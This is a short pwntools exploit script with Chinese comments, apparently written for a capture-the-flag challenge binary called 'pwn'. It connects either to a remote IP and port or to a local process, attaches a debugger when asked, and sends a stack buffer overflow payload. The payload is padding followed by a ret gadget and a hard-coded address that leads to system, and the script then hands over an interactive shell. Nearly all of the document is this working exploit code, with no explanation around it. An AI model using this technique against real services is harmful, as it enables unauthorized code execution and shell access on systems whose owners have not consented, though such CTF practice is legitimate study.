from kk import*
context.binary = elf = ELF('./pwn')
context.log_level = 'debug'

# 根据是否远程自动选择 libc
if args.LIBC:
    libc = ELF('./libc.so.6')  # 远程给的libc
else:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') #记得改

rop = ROP(elf)

def go():
    if args.KK:
        return remote('120.26.60.25',20175)
    else:
        return process(elf.path)

def pwn():
    p = go()

    # 如果带有 GDB 参数，则附加调试器
    if args.GDB:
        # 这里可以写默认的断点，比如 b main\nc
        GDB(p, 'b *0x4012f3\nc')

    # ================= 你的利用代码写这里 =================
    system = 0x401267
    ret  = 0x401280

    p.recvline(b"Then how many bytes do you need to overflow the stack?")
    p.sendline(b"100")

    payload = b'a'*(8+8) +  p64(ret) +   p64(system)
    p.send(payload.ljust(100, b'\x00'))

    # ======================================================

    p.interactive()

if __name__ == "__main__":
    pwn()